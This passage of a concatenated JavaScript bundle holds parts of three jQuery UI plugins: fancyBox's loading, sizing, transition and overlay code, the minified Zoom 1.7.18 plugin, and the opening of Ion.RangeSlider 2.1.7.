				minWidth   : 0,
				minHeight  : 0,
				scrolling  : 'no',
				hasError   : type,
				content    : F.coming.tpl.error
			});

			F._afterLoad();
		},

		_loadImage: function () {
			// Reset preload image so it is later possible to check "complete" property
			var img = F.imgPreload = new Image();

			img.onload = function () {
				this.onload = this.onerror = null;

				F.coming.width  = this.width / F.opts.pixelRatio;
				F.coming.height = this.height / F.opts.pixelRatio;

				F._afterLoad();
			};

			img.onerror = function () {
				this.onload = this.onerror = null;

				F._error( 'image' );
			};

			img.src = F.coming.href;

			if (img.complete !== true) {
				F.showLoading();
			}
		},

		_loadAjax: function () {
			var coming = F.coming;

			F.showLoading();

			F.ajaxLoad = $.ajax($.extend({}, coming.ajax, {
				url: coming.href,
				error: function (jqXHR, textStatus) {
					if (F.coming && textStatus !== 'abort') {
						F._error( 'ajax', jqXHR );

					} else {
						F.hideLoading();
					}
				},
				success: function (data, textStatus) {
					if (textStatus === 'success') {
						coming.content = data;

						F._afterLoad();
					}
				}
			}));
		},

		_loadIframe: function() {
			var coming = F.coming,
				iframe = $(coming.tpl.iframe.replace(/\{rnd\}/g, new Date().getTime()))
					.attr('scrolling', isTouch ? 'auto' : coming.iframe.scrolling)
					.attr('src', coming.href);

			// This helps IE
			$(coming.wrap).bind('onReset', function () {
				try {
					$(this).find('iframe').hide().attr('src', '//about:blank').end().empty();
				} catch (e) {}
			});

			if (coming.iframe.preload) {
				F.showLoading();

				iframe.one('load', function() {
					$(this).data('ready', 1);

					// iOS will lose scrolling if we resize
					if (!isTouch) {
						$(this).bind('load.fb', F.update);
					}

					// Without this trick:
					//   - iframe won't scroll on iOS devices
					//   - IE7 sometimes displays empty iframe
					$(this).parents('.fancybox-wrap').width('100%').removeClass('fancybox-tmp').show();

					F._afterLoad();
				});
			}

			coming.content = iframe.appendTo( coming.inner );

			if (!coming.iframe.preload) {
				F._afterLoad();
			}
		},

		_preloadImages: function() {
			var group   = F.group,
				current = F.current,
				len     = group.length,
				cnt     = current.preload ? Math.min(current.preload, len - 1) : 0,
				item,
				i;

			for (i = 1; i <= cnt; i += 1) {
				item = group[ (current.index + i ) % len ];

				if (item.type === 'image' && item.href) {
					new Image().src = item.href;
				}
			}
		},

		_afterLoad: function () {
			var coming   = F.coming,
				previous = F.current,
				placeholder = 'fancybox-placeholder',
				current,
				content,
				type,
				scrolling,
				href,
				embed;

			F.hideLoading();

			if (!coming || F.isActive === false) {
				return;
			}

			if (false === F.trigger('afterLoad', coming, previous)) {
				coming.wrap.stop(true).trigger('onReset').remove();

				F.coming = null;

				return;
			}

			if (previous) {
				F.trigger('beforeChange', previous);

				previous.wrap.stop(true).removeClass('fancybox-opened')
					.find('.fancybox-item, .fancybox-nav')
					.remove();
			}

			F.unbindEvents();

			current   = coming;
			content   = coming.content;
			type      = coming.type;
			scrolling = coming.scrolling;

			$.extend(F, {
				wrap  : current.wrap,
				skin  : current.skin,
				outer : current.outer,
				inner : current.inner,
				current  : current,
				previous : previous
			});

			href = current.href;

			switch (type) {
				case 'inline':
				case 'ajax':
				case 'html':
					if (current.selector) {
						content = $('<div>').html(content).find(current.selector);

					} else if (isQuery(content)) {
						if (!content.data(placeholder)) {
							content.data(placeholder, $('<div class="' + placeholder + '"></div>').insertAfter( content ).hide() );
						}

						content = content.show().detach();

						current.wrap.bind('onReset', function () {
							if ($(this).find(content).length) {
								content.hide().replaceAll( content.data(placeholder) ).data(placeholder, false);
							}
						});
					}
				break;

				case 'image':
					content = current.tpl.image.replace('{href}', href);
				break;

				case 'swf':
					content = '<object id="fancybox-swf" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="100%" height="100%"><param name="movie" value="' + href + '"></param>';
					embed   = '';

					$.each(current.swf, function(name, val) {
						content += '<param name="' + name + '" value="' + val + '"></param>';
						embed   += ' ' + name + '="' + val + '"';
					});

					content += '<embed src="' + href + '" type="application/x-shockwave-flash" width="100%" height="100%"' + embed + '></embed></object>';
				break;
			}

			if (!(isQuery(content) && content.parent().is(current.inner))) {
				current.inner.append( content );
			}

			// Give a chance for helpers or callbacks to update elements
			F.trigger('beforeShow');

			// Set scrolling before calculating dimensions
			current.inner.css('overflow', scrolling === 'yes' ? 'scroll' : (scrolling === 'no' ? 'hidden' : scrolling));

			// Set initial dimensions and start position
			F._setDimension();

			F.reposition();

			F.isOpen = false;
			F.coming = null;

			F.bindEvents();

			if (!F.isOpened) {
				$('.fancybox-wrap').not( current.wrap ).stop(true).trigger('onReset').remove();

			} else if (previous.prevMethod) {
				F.transitions[ previous.prevMethod ]();
			}

			F.transitions[ F.isOpened ? current.nextMethod : current.openMethod ]();

			F._preloadImages();
		},

		_setDimension: function () {
			var viewport   = F.getViewport(),
				steps      = 0,
				canShrink  = false,
				canExpand  = false,
				wrap       = F.wrap,
				skin       = F.skin,
				inner      = F.inner,
				current    = F.current,
				width      = current.width,
				height     = current.height,
				minWidth   = current.minWidth,
				minHeight  = current.minHeight,
				maxWidth   = current.maxWidth,
				maxHeight  = current.maxHeight,
				scrolling  = current.scrolling,
				scrollOut  = current.scrollOutside ? current.scrollbarWidth : 0,
				margin     = current.margin,
				wMargin    = getScalar(margin[1] + margin[3]),
				hMargin    = getScalar(margin[0] + margin[2]),
				wPadding,
				hPadding,
				wSpace,
				hSpace,
				origWidth,
				origHeight,
				origMaxWidth,
				origMaxHeight,
				ratio,
				width_,
				height_,
				maxWidth_,
				maxHeight_,
				iframe,
				body;

			// Reset dimensions so we could re-check actual size
			wrap.add(skin).add(inner).width('auto').height('auto').removeClass('fancybox-tmp');

			wPadding = getScalar(skin.outerWidth(true)  - skin.width());
			hPadding = getScalar(skin.outerHeight(true) - skin.height());

			// Any space between content and viewport (margin, padding, border, title)
			wSpace = wMargin + wPadding;
			hSpace = hMargin + hPadding;

			origWidth  = isPercentage(width)  ? (viewport.w - wSpace) * getScalar(width)  / 100 : width;
			origHeight = isPercentage(height) ? (viewport.h - hSpace) * getScalar(height) / 100 : height;

			if (current.type === 'iframe') {
				iframe = current.content;

				if (current.autoHeight && iframe.data('ready') === 1) {
					try {
						if (iframe[0].contentWindow.document.location) {
							inner.width( origWidth ).height(9999);

							body = iframe.contents().find('body');

							if (scrollOut) {
								body.css('overflow-x', 'hidden');
							}

							origHeight = body.outerHeight(true);
						}

					} catch (e) {}
				}

			} else if (current.autoWidth || current.autoHeight) {
				inner.addClass( 'fancybox-tmp' );

				// Set width or height in case we need to calculate only one dimension
				if (!current.autoWidth) {
					inner.width( origWidth );
				}

				if (!current.autoHeight) {
					inner.height( origHeight );
				}

				if (current.autoWidth) {
					origWidth = inner.width();
				}

				if (current.autoHeight) {
					origHeight = inner.height();
				}

				inner.removeClass( 'fancybox-tmp' );
			}

			width  = getScalar( origWidth );
			height = getScalar( origHeight );

			ratio  = origWidth / origHeight;

			// Calculations for the content
			minWidth  = getScalar(isPercentage(minWidth) ? getScalar(minWidth, 'w') - wSpace : minWidth);
			maxWidth  = getScalar(isPercentage(maxWidth) ? getScalar(maxWidth, 'w') - wSpace : maxWidth);

			minHeight = getScalar(isPercentage(minHeight) ? getScalar(minHeight, 'h') - hSpace : minHeight);
			maxHeight = getScalar(isPercentage(maxHeight) ? getScalar(maxHeight, 'h') - hSpace : maxHeight);

			// These will be used to determine if wrap can fit in the viewport
			origMaxWidth  = maxWidth;
			origMaxHeight = maxHeight;

			if (current.fitToView) {
				maxWidth  = Math.min(viewport.w - wSpace, maxWidth);
				maxHeight = Math.min(viewport.h - hSpace, maxHeight);
			}

			maxWidth_  = viewport.w - wMargin;
			maxHeight_ = viewport.h - hMargin;

			if (current.aspectRatio) {
				if (width > maxWidth) {
					width  = maxWidth;
					height = getScalar(width / ratio);
				}

				if (height > maxHeight) {
					height = maxHeight;
					width  = getScalar(height * ratio);
				}

				if (width < minWidth) {
					width  = minWidth;
					height = getScalar(width / ratio);
				}

				if (height < minHeight) {
					height = minHeight;
					width  = getScalar(height * ratio);
				}

			} else {
				width = Math.max(minWidth, Math.min(width, maxWidth));

				if (current.autoHeight && current.type !== 'iframe') {
					inner.width( width );

					height = inner.height();
				}

				height = Math.max(minHeight, Math.min(height, maxHeight));
			}

			// Try to fit inside viewport (including the title)
			if (current.fitToView) {
				inner.width( width ).height( height );

				wrap.width( width + wPadding );

				// Real wrap dimensions
				width_  = wrap.width();
				height_ = wrap.height();

				if (current.aspectRatio) {
					while ((width_ > maxWidth_ || height_ > maxHeight_) && width > minWidth && height > minHeight) {
						if (steps++ > 19) {
							break;
						}

						height = Math.max(minHeight, Math.min(maxHeight, height - 10));
						width  = getScalar(height * ratio);

						if (width < minWidth) {
							width  = minWidth;
							height = getScalar(width / ratio);
						}

						if (width > maxWidth) {
							width  = maxWidth;
							height = getScalar(width / ratio);
						}

						inner.width( width ).height( height );

						wrap.width( width + wPadding );

						width_  = wrap.width();
						height_ = wrap.height();
					}

				} else {
					width  = Math.max(minWidth,  Math.min(width,  width  - (width_  - maxWidth_)));
					height = Math.max(minHeight, Math.min(height, height - (height_ - maxHeight_)));
				}
			}

			if (scrollOut && scrolling === 'auto' && height < origHeight && (width + wPadding + scrollOut) < maxWidth_) {
				width += scrollOut;
			}

			inner.width( width ).height( height );

			wrap.width( width + wPadding );

			width_  = wrap.width();
			height_ = wrap.height();

			canShrink = (width_ > maxWidth_ || height_ > maxHeight_) && width > minWidth && height > minHeight;
			canExpand = current.aspectRatio ? (width < origMaxWidth && height < origMaxHeight && width < origWidth && height < origHeight) : ((width < origMaxWidth || height < origMaxHeight) && (width < origWidth || height < origHeight));

			$.extend(current, {
				dim : {
					width	: getValue( width_ ),
					height	: getValue( height_ )
				},
				origWidth  : origWidth,
				origHeight : origHeight,
				canShrink  : canShrink,
				canExpand  : canExpand,
				wPadding   : wPadding,
				hPadding   : hPadding,
				wrapSpace  : height_ - skin.outerHeight(true),
				skinSpace  : skin.height() - height
			});

			if (!iframe && current.autoHeight && height > minHeight && height < maxHeight && !canExpand) {
				inner.height('auto');
			}
		},

		_getPosition: function (onlyAbsolute) {
			var current  = F.current,
				viewport = F.getViewport(),
				margin   = current.margin,
				width    = F.wrap.width()  + margin[1] + margin[3],
				height   = F.wrap.height() + margin[0] + margin[2],
				rez      = {
					position: 'absolute',
					top  : margin[0],
					left : margin[3]
				};

			if (current.autoCenter && current.fixed && !onlyAbsolute && height <= viewport.h && width <= viewport.w) {
				rez.position = 'fixed';

			} else if (!current.locked) {
				rez.top  += viewport.y;
				rez.left += viewport.x;
			}

			rez.top  = getValue(Math.max(rez.top,  rez.top  + ((viewport.h - height) * current.topRatio)));
			rez.left = getValue(Math.max(rez.left, rez.left + ((viewport.w - width)  * current.leftRatio)));

			return rez;
		},

		_afterZoomIn: function () {
			var current = F.current;

			if (!current) {
				return;
			}

			F.isOpen = F.isOpened = true;

			F.wrap.css('overflow', 'visible').addClass('fancybox-opened');

			F.update();

			// Assign a click event
			if ( current.closeClick || (current.nextClick && F.group.length > 1) ) {
				F.inner.css('cursor', 'pointer').bind('click.fb', function(e) {
					if (!$(e.target).is('a') && !$(e.target).parent().is('a')) {
						e.preventDefault();

						F[ current.closeClick ? 'close' : 'next' ]();
					}
				});
			}

			// Create a close button
			if (current.closeBtn) {
				$(current.tpl.closeBtn).appendTo(F.skin).bind('click.fb', function(e) {
					e.preventDefault();

					F.close();
				});
			}

			// Create navigation arrows
			if (current.arrows && F.group.length > 1) {
				if (current.loop || current.index > 0) {
					$(current.tpl.prev).appendTo(F.outer).bind('click.fb', F.prev);
				}

				if (current.loop || current.index < F.group.length - 1) {
					$(current.tpl.next).appendTo(F.outer).bind('click.fb', F.next);
				}
			}

			F.trigger('afterShow');

			// Stop the slideshow if this is the last item
			if (!current.loop && current.index === current.group.length - 1) {
				F.play( false );

			} else if (F.opts.autoPlay && !F.player.isActive) {
				F.opts.autoPlay = false;

				F.play();
			}
		},

		_afterZoomOut: function ( obj ) {
			obj = obj || F.current;

			$('.fancybox-wrap').trigger('onReset').remove();

			$.extend(F, {
				group  : {},
				opts   : {},
				router : false,
				current   : null,
				isActive  : false,
				isOpened  : false,
				isOpen    : false,
				isClosing : false,
				wrap   : null,
				skin   : null,
				outer  : null,
				inner  : null
			});

			F.trigger('afterClose', obj);
		}
	});

	/*
	 *	Default transitions
	 */

	F.transitions = {
		getOrigPosition: function () {
			var current  = F.current,
				element  = current.element,
				orig     = current.orig,
				pos      = {},
				width    = 50,
				height   = 50,
				hPadding = current.hPadding,
				wPadding = current.wPadding,
				viewport = F.getViewport();

			if (!orig && current.isDom && element.is(':visible')) {
				orig = element.find('img:first');

				if (!orig.length) {
					orig = element;
				}
			}

			if (isQuery(orig)) {
				pos = orig.offset();

				if (orig.is('img')) {
					width  = orig.outerWidth();
					height = orig.outerHeight();
				}

			} else {
				pos.top  = viewport.y + (viewport.h - height) * current.topRatio;
				pos.left = viewport.x + (viewport.w - width)  * current.leftRatio;
			}

			if (F.wrap.css('position') === 'fixed' || current.locked) {
				pos.top  -= viewport.y;
				pos.left -= viewport.x;
			}

			pos = {
				top     : getValue(pos.top  - hPadding * current.topRatio),
				left    : getValue(pos.left - wPadding * current.leftRatio),
				width   : getValue(width  + wPadding),
				height  : getValue(height + hPadding)
			};

			return pos;
		},

		step: function (now, fx) {
			var ratio,
				padding,
				value,
				prop       = fx.prop,
				current    = F.current,
				wrapSpace  = current.wrapSpace,
				skinSpace  = current.skinSpace;

			if (prop === 'width' || prop === 'height') {
				ratio = fx.end === fx.start ? 1 : (now - fx.start) / (fx.end - fx.start);

				if (F.isClosing) {
					ratio = 1 - ratio;
				}

				padding = prop === 'width' ? current.wPadding : current.hPadding;
				value   = now - padding;

				F.skin[ prop ](  getScalar( prop === 'width' ?  value : value - (wrapSpace * ratio) ) );
				F.inner[ prop ]( getScalar( prop === 'width' ?  value : value - (wrapSpace * ratio) - (skinSpace * ratio) ) );
			}
		},

		zoomIn: function () {
			var current  = F.current,
				startPos = current.pos,
				effect   = current.openEffect,
				elastic  = effect === 'elastic',
				endPos   = $.extend({opacity : 1}, startPos);

			// Remove "position" property that breaks older IE
			delete endPos.position;

			if (elastic) {
				startPos = this.getOrigPosition();

				if (current.openOpacity) {
					startPos.opacity = 0.1;
				}

			} else if (effect === 'fade') {
				startPos.opacity = 0.1;
			}

			F.wrap.css(startPos).animate(endPos, {
				duration : effect === 'none' ? 0 : current.openSpeed,
				easing   : current.openEasing,
				step     : elastic ? this.step : null,
				complete : F._afterZoomIn
			});
		},

		zoomOut: function () {
			var current  = F.current,
				effect   = current.closeEffect,
				elastic  = effect === 'elastic',
				endPos   = {opacity : 0.1};

			if (elastic) {
				endPos = this.getOrigPosition();

				if (current.closeOpacity) {
					endPos.opacity = 0.1;
				}
			}

			F.wrap.animate(endPos, {
				duration : effect === 'none' ? 0 : current.closeSpeed,
				easing   : current.closeEasing,
				step     : elastic ? this.step : null,
				complete : F._afterZoomOut
			});
		},

		changeIn: function () {
			var current   = F.current,
				effect    = current.nextEffect,
				startPos  = current.pos,
				endPos    = { opacity : 1 },
				direction = F.direction,
				distance  = 200,
				field;

			startPos.opacity = 0.1;

			if (effect === 'elastic') {
				field = direction === 'down' || direction === 'up' ? 'top' : 'left';

				if (direction === 'down' || direction === 'right') {
					startPos[ field ] = getValue(getScalar(startPos[ field ]) - distance);
					endPos[ field ]   = '+=' + distance + 'px';

				} else {
					startPos[ field ] = getValue(getScalar(startPos[ field ]) + distance);
					endPos[ field ]   = '-=' + distance + 'px';
				}
			}

			// Workaround for http://bugs.jquery.com/ticket/12273
			if (effect === 'none') {
				F._afterZoomIn();

			} else {
				F.wrap.css(startPos).animate(endPos, {
					duration : current.nextSpeed,
					easing   : current.nextEasing,
					complete : F._afterZoomIn
				});
			}
		},

		changeOut: function () {
			var previous  = F.previous,
				effect    = previous.prevEffect,
				endPos    = { opacity : 0.1 },
				direction = F.direction,
				distance  = 200;

			if (effect === 'elastic') {
				endPos[ direction === 'down' || direction === 'up' ? 'top' : 'left' ] = ( direction === 'up' || direction === 'left' ? '-' : '+' ) + '=' + distance + 'px';
			}

			previous.wrap.animate(endPos, {
				duration : effect === 'none' ? 0 : previous.prevSpeed,
				easing   : previous.prevEasing,
				complete : function () {
					$(this).trigger('onReset').remove();
				}
			});
		}
	};

	/*
	 *	Overlay helper
	 */

	F.helpers.overlay = {
		defaults : {
			closeClick : true,      // if true, fancyBox will be closed when user clicks on the overlay
			speedOut   : 200,       // duration of fadeOut animation
			showEarly  : true,      // indicates if should be opened immediately or wait until the content is ready
			css        : {},        // custom CSS properties
			locked     : !isTouch,  // if true, the content will be locked into overlay
			fixed      : true       // if false, the overlay CSS position property will not be set to "fixed"
		},

		overlay : null,      // current handle
		fixed   : false,     // indicates if the overlay has position "fixed"
		el      : $('html'), // element that contains "the lock"

		// Public methods
		create : function(opts) {
			opts = $.extend({}, this.defaults, opts);

			if (this.overlay) {
				this.close();
			}

			this.overlay = $('<div class="fancybox-overlay"></div>').appendTo( F.coming ? F.coming.parent : opts.parent );
			this.fixed   = false;

			if (opts.fixed && F.defaults.fixed) {
				this.overlay.addClass('fancybox-overlay-fixed');

				this.fixed = true;
			}
		},

		open : function(opts) {
			var that = this;

			opts = $.extend({}, this.defaults, opts);

			if (this.overlay) {
				this.overlay.unbind('.overlay').width('auto').height('auto');

			} else {
				this.create(opts);
			}

			if (!this.fixed) {
				W.bind('resize.overlay', $.proxy( this.update, this) );

				this.update();
			}

			if (opts.closeClick) {
				this.overlay.bind('click.overlay', function(e) {
					if ($(e.target).hasClass('fancybox-overlay')) {
						if (F.isActive) {
							F.close();
						} else {
							that.close();
						}

						return false;
					}
				});
			}

			this.overlay.css( opts.css ).show();
		},

		close : function() {
			var scrollV, scrollH;

			W.unbind('resize.overlay');

			if (this.el.hasClass('fancybox-lock')) {
				$('.fancybox-margin').removeClass('fancybox-margin');

				scrollV = W.scrollTop();
				scrollH = W.scrollLeft();

				this.el.removeClass('fancybox-lock');

				W.scrollTop( scrollV ).scrollLeft( scrollH );
			}

			$('.fancybox-overlay').remove().hide();

			$.extend(this, {
				overlay : null,
				fixed   : false
			});
		},

		// Private, callbacks

		update : function () {
			var width = '100%', offsetWidth;

			// Reset width/height so it will not mess
			this.overlay.width(width).height('100%');

			// jQuery does not return reliable result for IE
			if (IE) {
				offsetWidth = Math.max(document.documentElement.offsetWidth, document.body.offsetWidth);

				if (D.width() > offsetWidth) {
					width = D.width();
				}

			} else if (D.width() > W.width()) {
				width = D.width();
			}

			this.overlay.width(width).height(D.height());
		},

		// This is where we can manipulate DOM, because later it would cause iframes to reload
		onReady : function (opts, obj) {
			var overlay = this.overlay;

			$('.fancybox-overlay').stop(true, true);

			if (!overlay) {
				this.create(opts);
			}

			if (opts.locked && this.fixed && obj.fixed) {
				if (!overlay) {
					this.margin = D.height() > W.height() ? $('html').css('margin-right').replace("px", "") : false;
				}

				obj.locked = this.overlay.append( obj.wrap );
				obj.fixed  = false;
			}

			if (opts.showEarly === true) {
				this.beforeShow.apply(this, arguments);
			}
		},

		beforeShow : function(opts, obj) {
			var scrollV, scrollH;

			if (obj.locked) {
				if (this.margin !== false) {
					$('*').filter(function(){
						return ($(this).css('position') === 'fixed' && !$(this).hasClass("fancybox-overlay") && !$(this).hasClass("fancybox-wrap") );
					}).addClass('fancybox-margin');

					this.el.addClass('fancybox-margin');
				}

				scrollV = W.scrollTop();
				scrollH = W.scrollLeft();

				this.el.addClass('fancybox-lock');

				W.scrollTop( scrollV ).scrollLeft( scrollH );
			}

			this.open(opts);
		},

		onUpdate : function() {
			if (!this.fixed) {
				this.update();
			}
		},

		afterClose: function (opts) {
			// Remove overlay if exists and fancyBox is not opening
			// (e.g., it is not being open using afterClose callback)
			//if (this.overlay && !F.isActive) {
			if (this.overlay && !F.coming) {
				this.overlay.fadeOut(opts.speedOut, $.proxy( this.close, this ));
			}
		}
	};

	/*
	 *	Title helper
	 */

	F.helpers.title = {
		defaults : {
			type     : 'float', // 'float', 'inside', 'outside' or 'over',
			position : 'bottom' // 'top' or 'bottom'
		},

		beforeShow: function (opts) {
			var current = F.current,
				text    = current.title,
				type    = opts.type,
				title,
				target;

			if ($.isFunction(text)) {
				text = text.call(current.element, current);
			}

			if (!isString(text) || $.trim(text) === '') {
				return;
			}

			title = $('<div class="fancybox-title fancybox-title-' + type + '-wrap">' + text + '</div>');

			switch (type) {
				case 'inside':
					target = F.skin;
				break;

				case 'outside':
					target = F.wrap;
				break;

				case 'over':
					target = F.inner;
				break;

				default: // 'float'
					target = F.skin;

					title.appendTo('body');

					if (IE) {
						title.width( title.width() );
					}

					title.wrapInner('<span class="child"></span>');

					//Increase bottom margin so this title will also fit into viewport
					F.current.margin[2] += Math.abs( getScalar(title.css('margin-bottom')) );
				break;
			}

			title[ (opts.position === 'top' ? 'prependTo'  : 'appendTo') ](target);
		}
	};

	// jQuery plugin initialization
	$.fn.fancybox = function (options) {
		var index,
			that     = $(this),
			selector = this.selector || '',
			run      = function(e) {
				var what = $(this).blur(), idx = index, relType, relVal;

				if (!(e.ctrlKey || e.altKey || e.shiftKey || e.metaKey) && !what.is('.fancybox-wrap')) {
					relType = options.groupAttr || 'data-fancybox-group';
					relVal  = what.attr(relType);

					if (!relVal) {
						relType = 'rel';
						relVal  = what.get(0)[ relType ];
					}

					if (relVal && relVal !== '' && relVal !== 'nofollow') {
						what = selector.length ? $(selector) : that;
						what = what.filter('[' + relType + '="' + relVal + '"]');
						idx  = what.index(this);
					}

					options.index = idx;

					// Stop an event from bubbling if everything is fine
					if (F.open(what, options) !== false) {
						e.preventDefault();
					}
				}
			};

		options = options || {};
		index   = options.index || 0;

		if (!selector || options.live === false) {
			that.unbind('click.fb-start').bind('click.fb-start', run);

		} else {
			D.undelegate(selector, 'click.fb-start').delegate(selector + ":not('.fancybox-item, .fancybox-nav')", 'click.fb-start', run);
		}

		this.filter('[data-fancybox-start=1]').trigger('click');

		return this;
	};

	// Tests that need a body at doc ready
	D.ready(function() {
		var w1, w2;

		if ( $.scrollbarWidth === undefined ) {
			// http://benalman.com/projects/jquery-misc-plugins/#scrollbarwidth
			$.scrollbarWidth = function() {
				var parent = $('<div style="width:50px;height:50px;overflow:auto"><div/></div>').appendTo('body'),
					child  = parent.children(),
					width  = child.innerWidth() - child.height( 99 ).innerWidth();

				parent.remove();

				return width;
			};
		}

		if ( $.support.fixedPosition === undefined ) {
			$.support.fixedPosition = (function() {
				var elem  = $('<div style="position:fixed;top:20px;"></div>').appendTo('body'),
					fixed = ( elem[0].offsetTop === 20 || elem[0].offsetTop === 15 );

				elem.remove();

				return fixed;
			}());
		}

		$.extend(F.defaults, {
			scrollbarWidth : $.scrollbarWidth(),
			fixed  : $.support.fixedPosition,
			parent : $('body')
		});

		//Get real width of page scroll-bar
		w1 = $(window).width();

		H.addClass('fancybox-lock-test');

		w2 = $(window).width();

		H.removeClass('fancybox-lock-test');

		$("<style type='text/css'>.fancybox-margin{margin-right:" + (w2 - w1) + "px;}</style>").appendTo("head");
	});

}(window, document, jQuery));





/*!
	Zoom 1.7.18
	license: MIT
	http://www.jacklmoore.com/zoom
*/
(function(o){var t={url:!1,callback:!1,target:!1,duration:120,on:"mouseover",touch:!0,onZoomIn:!1,onZoomOut:!1,magnify:1};o.zoom=function(t,n,e,i){var u,c,a,r,m,l,s,f=o(t),h=f.css("position"),d=o(n);return t.style.position=/(absolute|fixed)/.test(h)?h:"relative",t.style.overflow="hidden",e.style.width=e.style.height="",o(e).addClass("zoomImg").css({position:"absolute",top:0,left:0,opacity:0,width:e.width*i,height:e.height*i,border:"none",maxWidth:"none",maxHeight:"none"}).appendTo(t),{init:function(){c=f.outerWidth(),u=f.outerHeight(),n===t?(r=c,a=u):(r=d.outerWidth(),a=d.outerHeight()),m=(e.width-c)/r,l=(e.height-u)/a,s=d.offset()},move:function(o){var t=o.pageX-s.left,n=o.pageY-s.top;n=Math.max(Math.min(n,a),0),t=Math.max(Math.min(t,r),0),e.style.left=t*-m+"px",e.style.top=n*-l+"px"}}},o.fn.zoom=function(n){return this.each(function(){var e=o.extend({},t,n||{}),i=e.target&&o(e.target)[0]||this,u=this,c=o(u),a=document.createElement("img"),r=o(a),m="mousemove.zoom",l=!1,s=!1;if(!e.url){var f=u.querySelector("img");if(f&&(e.url=f.getAttribute("data-src")||f.currentSrc||f.src),!e.url)return}c.one("zoom.destroy",function(o,t){c.off(".zoom"),i.style.position=o,i.style.overflow=t,a.onload=null,r.remove()}.bind(this,i.style.position,i.style.overflow)),a.onload=function(){function t(t){f.init(),f.move(t),r.stop().fadeTo(o.support.opacity?e.duration:0,1,o.isFunction(e.onZoomIn)?e.onZoomIn.call(a):!1)}function n(){r.stop().fadeTo(e.duration,0,o.isFunction(e.onZoomOut)?e.onZoomOut.call(a):!1)}var f=o.zoom(i,u,a,e.magnify);"grab"===e.on?c.on("mousedown.zoom",function(e){1===e.which&&(o(document).one("mouseup.zoom",function(){n(),o(document).off(m,f.move)}),t(e),o(document).on(m,f.move),e.preventDefault())}):"click"===e.on?c.on("click.zoom",function(e){return l?void 0:(l=!0,t(e),o(document).on(m,f.move),o(document).one("click.zoom",function(){n(),l=!1,o(document).off(m,f.move)}),!1)}):"toggle"===e.on?c.on("click.zoom",function(o){l?n():t(o),l=!l}):"mouseover"===e.on&&(f.init(),c.on("mouseenter.zoom",t).on("mouseleave.zoom",n).on(m,f.move)),e.touch&&c.on("touchstart.zoom",function(o){o.preventDefault(),s?(s=!1,n()):(s=!0,t(o.originalEvent.touches[0]||o.originalEvent.changedTouches[0]))}).on("touchmove.zoom",function(o){o.preventDefault(),f.move(o.originalEvent.touches[0]||o.originalEvent.changedTouches[0])}).on("touchend.zoom",function(o){o.preventDefault(),s&&(s=!1,n())}),o.isFunction(e.callback)&&e.callback.call(a)},a.src=e.url})},o.fn.zoom.defaults=t})(window.jQuery);




// Ion.RangeSlider
// version 2.1.7 Build: 371
// Â© Denis Ineshin, 2017
// https://github.com/IonDen
//
// Project page:    http://ionden.com/a/plugins/ion.rangeSlider/en.html
// GitHub page:     https://github.com/IonDen/ion.rangeSlider
//
// Released under MIT licence:
// http://ionden.com/a/plugins/licence-en.html
// =====================================================================================================================

;(function(factory) {
    if (typeof define === "function" && define.amd) {
        define(["jquery"], function (jQuery) {
            return factory(jQuery, document, window, navigator);
        });
    } else if (typeof exports === "object") {
        factory(require("jquery"), document, window, navigator);
    } else {
        factory(jQuery, document, window, navigator);
    }
} (function ($, document, window, navigator, undefined) {
    "use strict";

    // =================================================================================================================
    // Service

    var plugin_count = 0;

    // IE8 fix
    var is_old_ie = (function () {
        var n = navigator.userAgent,
            r = /msie\s\d+/i,
            v;
        if (n.search(r) > 0) {
            v = r.exec(n).toString();
            v = v.split(" ")[1];
            if (v < 9) {
                $("html").addClass("lt-ie9");
                return true;
            }
        }
        return false;
    } ());
    if (!Function.prototype.bind) {
        Function.prototype.bind = function bind(that) {

            var target = this;
            var slice = [].slice;

            if (typeof target != "function") {
                throw new TypeError();
            }

            var args = slice.call(arguments, 1),
                bound = function () {

                    if (this instanceof bound) {

                        var F = function(){};
                        F.prototype = target.prototype;
                        var self = new F();

                        var result = target.apply(
                            self,
                            args.concat(slice.call(arguments))
                        );
                        if (Object(result) === result) {
                            return result;
                        }
                        return self;

                    } else {

                        return target.apply(
                            that,
                            args.concat(slice.call(arguments))
                        );

                    }

                };

            return bound;
        };
    }
    if (!Array.prototype.indexOf) {
        Array.prototype.indexOf = function(searchElement, fromIndex) {
            var k;
            if (this == null) {
                throw new TypeError('"this" is null or not defined');
            }
            var O = Object(this);
            var len = O.length >>> 0;
            if (len === 0) {
                return -1;
            }
            var n = +fromIndex || 0;
            if (Math.abs(n) === Infinity) {
                n = 0;
            }
            if (n >= len) {
                return -1;
            }
            k = Math.max(n >= 0 ? n : len - Math.abs(n), 0);
            while (k < len) {
                if (k in O && O[k] === searchElement) {
                    return k;
                }
                k++;
            }
            return -1;
        };
    }



    // =================================================================================================================
    // Template

    var base_html =
        '<span class="irs">' +
        '<span class="irs-line" tabindex="-1"><span class="irs-line-left"></span><span class="irs-line-mid"></span><span class="irs-line-right"></span></span>' +
        '<span class="irs-min">0</span><span class="irs-max">1</span>' +
        '<span class="irs-from">0</span><span class="irs-to">0</span><span class="irs-single">0</span>' +
        '</span>' +
        '<span class="irs-grid"></span>' +
        '<span class="irs-bar"></span>';

    var single_html =
        '<span class="irs-bar-edge"></span>' +
        '<span class="irs-shadow shadow-single"></span>' +
        '<span class="irs-slider single"></span>';

    var double_html =
        '<span class="irs-shadow shadow-from"></span>' +
        '<span class="irs-shadow shadow-to"></span>' +
        '<span class="irs-slider from"></span>' +
        '<span class="irs-slider to"></span>';

    var disable_html =
        '<span class="irs-disable-mask"></span>';



    // =================================================================================================================
    // Core

    /**
     * Main plugin constructor
     *
     * @param input {Object} link to base input element
     * @param options {Object} slider config
     * @param plugin_count {Number}
     * @constructor
     */
    var IonRangeSlider = function (input, options, plugin_count) {
        this.VERSION = "2.1.7";
        this.input = input;
        this.plugin_count = plugin_count;
        this.current_plugin = 0;
        this.calc_count = 0;
        this.update_tm = 0;
        this.old_from = 0;
        this.old_to = 0;
        this.old_min_interval = null;
        this.raf_id = null;
        this.dragging = false;
        this.force_redraw = false;
        this.no_diapason = false;
        this.is_key = false;
        this.is_update = false;
        this.is_start = true;
        this.is_finish = false;
        this.is_active = false;
        this.is_resize = false;
        this.is_click = false;

        options = options || {};

        // cache for links to all DOM elements
        this.$cache = {
            win: $(window),
            body: $(document.body),
            input: $(input),
            cont: null,
            rs: null,
            min: null,
            max: null,
            from: null,
            to: null,
            single: null,
            bar: null,
            line: null,
            s_single: null,
            s_from: null,
            s_to: null,
            shad_single: null,
            shad_from: null,
            shad_to: null,
            edge: null,
